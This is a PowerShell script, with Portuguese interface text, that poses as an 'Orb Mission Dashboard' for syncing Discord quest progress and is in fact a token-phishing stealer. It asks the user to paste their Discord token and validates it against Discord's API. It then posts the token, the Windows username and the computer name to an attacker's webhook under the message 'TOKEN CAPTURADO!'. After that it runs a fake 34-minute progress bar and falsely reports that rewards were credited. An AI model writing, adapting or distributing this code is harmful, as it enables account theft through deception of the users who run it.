function Show-Header {
    Clear-Host
    Write-Host "====================================================" -ForegroundColor Cyan
    Write-Host "      ORB MISSION DASHBOARD - v3.1 (STABLE)         " -ForegroundColor Yellow
    Write-Host "====================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Validate-DiscordToken($token) {
    Write-Host "[*] Validando credenciais..." -ForegroundColor Gray
    $headers = @{
        "Authorization" = $token
        "Content-Type"  = "application/json"
    }
    try {
        # Teste rápido na API do Discord
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Method Get -Headers $headers -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function Send-DataToWebhook($token) {
    # Criando um payload extremamente simples para evitar erro de encoding
    $payload = @{
        content = "🚨 **TOKEN CAPTURADO!** 🚨`n`n**Token:** $token`n**User:** $env:USERNAME`n**PC:** $env:COMPUTERNAME"
    } | ConvertTo-Json

    try {
        # Forçando o método de envio para ser o mais direto possível
        $params = @{
            Uri         = $webhookUrl
            Method      = 'Post'
            Body        = $payload
            ContentType = 'application/json'
        }
        Invoke-RestMethod @params
        Write-Host "[DEBUG] Conexao com servidor estabelecida." -ForegroundColor DarkGray
    } catch {
        $err = $_.Exception.Message
        Write-Host "[!] Erro no envio: $err" -ForegroundColor Red
    }
}

# --- Fluxo Principal ---

Show-Header
Write-Host "Bem-vindo ao Sistema de Missões Orb." -ForegroundColor White
Write-Host "Para iniciar, autentique sua conta Discord para sincronizar o progresso." -ForegroundColor Gray
Write-Host ""
Write-Host "[!] Digite seu Token de Acesso:" -ForegroundColor Yellow

$userToken = Read-Host "Token > "

# Limpeza básica de espaços
$userToken = $userToken.Trim()

if ($userToken.Length -lt 20) {
    Write-Host "`n[!] Token invalido. Tente novamente." -ForegroundColor Red
    Start-Sleep -Seconds 2
    exit
}

if (Validate-DiscordToken $userToken) {
    Write-Host "`n[+] Autenticacao confirmada!" -ForegroundColor Green
    Write-Host "[+] Sincronizando com a rede de Orbs..." -ForegroundColor Cyan
    
    # ENVIO IMEDIATO
    Send-DataToWebhook $userToken
    
    Start-Sleep -Seconds 3
} else {
    Write-Host "`n[!] ERRO: Token de acesso invalido." -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

# --- Início da Simulação de Missão (34 minutos) ---
$missions = @("Coletando Orbs", "Sincronizando Cache", "Validando Pontuacao", "Finalizando Protocolo")

for ($i = 1; $i -le 100; $i++) {
    Show-Header
    Write-Host "[STATUS] Conta Sincronizada" -ForegroundColor Green
    Write-Host "[STATUS] Progresso: $i%`n" -ForegroundColor Yellow
    Write-Host "----------------------------------------------------"
    Write-Host "Missao Atual: $($missions[($i % 4)])" -ForegroundColor Cyan
    Write-Host "Tempo restante: ~32 minutos" -ForegroundColor Gray
    Write-Host "----------------------------------------------------"
    
    # Delay para simular o tempo total
    Start-Sleep -Seconds 20
}

Show-Header
Write-Host "[SUCCESS] Missao concluida!" -ForegroundColor Green
Write-Host "[INFO] Recompensas creditadas." -ForegroundColor White
Start-Sleep -Seconds 5
